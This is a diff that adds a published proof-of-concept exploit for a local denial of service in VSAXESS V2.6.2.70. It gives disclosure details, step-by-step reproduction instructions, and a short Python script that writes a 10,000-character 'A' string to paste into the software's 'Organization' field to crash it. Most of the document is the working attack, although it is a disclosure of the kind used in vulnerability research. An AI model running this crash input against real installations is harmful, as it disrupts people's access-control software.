@@ -1,0 +1,26 @@
+# Exploit Title: VSAXESS V2.6.2.70 build20171226_053 - 'organization' Denial of Service (PoC)
+# Discovery by: Diego Santamaria
+# Discovery Date: 2018-11-05
+# Vendor Homepage: https:https://www.visionistech.com/en/home/
+# Software Link: https://www.visionistech.com/en/vsaxess-desktop-software/
+# Tested Version: V2.6.2.70 build20171226_053
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows 7 Professional
+ 
+# Steps to Reproduce: 
+
+# 1. Run the python code organization.py 
+# 2. Open organization_exploit.txt and copy the content 
+# 3. Open VSAXESS.exe 
+# 4. Register a password and username
+# 5. choose 'Control Panel'
+# 6. choose 'Access Control'
+# 7. choose 'Add'
+# 8. Paste the content from organization_exploit.txt on 'Organization' and Crashed
+ 
+#!/usr/bin/env python3
+
+content = "\x41" * 10000
+f = open ("organization_exploit.txt", "w")
+f.write(content)
+f.close()
